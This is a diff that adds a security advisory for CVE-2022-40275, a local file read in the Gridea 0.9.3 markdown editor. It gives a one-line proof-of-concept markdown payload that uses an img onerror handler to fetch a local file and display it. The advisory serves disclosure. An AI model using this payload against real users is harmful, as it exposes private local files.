@@ -1,0 +1,105 @@
+---
+slug: advisories/deadmau5/
+title: Gridea 0.9.3  -  Local File Read
+authors: Carlos Bello
+writer: cbello
+codename: deadmau5
+product: Gridea 0.9.3
+date: 2022-09-09 20:30 COT
+cveid: CVE-2022-40275
+severity: 6.5
+description: Gridea 0.9.3  -  Local File Read
+keywords: Fluid Attacks, Security, Vulnerabilities, Gridea
+banner: advisories-bg
+advise: no
+template: advisory
+---
+
+## Summary
+
+|                       |                                                        |
+| --------------------- | -------------------------------------------------------|
+| **Name**              | Gridea 0.9.3  -  Local File Read                       |
+| **Code name**         | [Deadmau5](https://en.wikipedia.org/wiki/Deadmau5)     |
+| **Product**           | Gridea                                                 |
+| **Affected versions** | Version 0.9.3                                          |
+| **State**             | Private                                                |
+| **Release date**      | 2022-09-09                                             |
+
+## Vulnerability
+
+|                       |                                                                                                        |
+| --------------------- | ------------------------------------------------------------------------------------------------------ |
+| **Kind**              | Lack of data validation - URL                                                                          |
+| **Rule**              | [141. Lack of data validation - URL](https://docs.fluidattacks.com/criteria/vulnerabilities/141)       |
+| **Remote**            | Yes                                                                                                    |
+| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N                                                           |
+| **CVSSv3 Base Score** | 6.5                                                                                                    |
+| **Exploit available** | Yes                                                                                                    |
+| **CVE ID(s)**         | [CVE-2022-40275](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40275)                        |
+
+## Description
+
+Gridea version 0.9.3 allows an external attacker to remotely obtain
+arbitrary local files on any client that attempts to view a malicious
+markdown file through Gridea. This is possible because the application
+does not have a CSP policy (or at least not strict enough) and/or does
+not properly validate the contents of markdown files before rendering
+them.
+
+## Vulnerability
+
+This vulnerability occurs because the application does not have a CSP policy
+(or at least not strict enough) and/or does not properly validate the contents
+of markdown files before rendering them.  Because of the above, an attacker can
+embed malicious JS code in a markdown file and send it to the victim to view and
+thus achieve an exfiltration of their local files.
+
+## Exploitation
+
+To exploit this vulnerability, you must send the following file to a user to open
+with Gridea. The exploit is triggered when the user presses "CTRL+P" or simply
+clicks "preview".
+
+### exploit.md
+
+```markdown
+<img src="1" onerror='fetch("file:///etc/private").then(data => data.text()).then(leak => alert(leak));'/>
+```
+
+## Our security police
+
+We have reserved the CVE-2022-40275 to refer to this issue from now on.
+
+* https://fluidattacks.com/advisories/policy/
+
+## System Information
+
+* Version: Gridea 0.9.3
+
+* Operating System: GNU/Linux
+
+## Mitigation
+
+There is currently no patch available for this vulnerability.
+
+## Credits
+
+The vulnerability was discovered by [Carlos
+Bello](https://www.linkedin.com/in/carlos-andres-bello) from the Offensive
+Team of `Fluid Attacks`.
+
+## References
+
+**Vendor page** <https://github.com/getgridea/gridea>
+
+## Timeline
+
+<time-lapse
+  discovered="2022-09-05"
+  contacted="2022-09-05"
+  replied=""
+  confirmed="2022-09-00"
+  patched=""
+  disclosure="2022-09-00">
+</time-lapse>
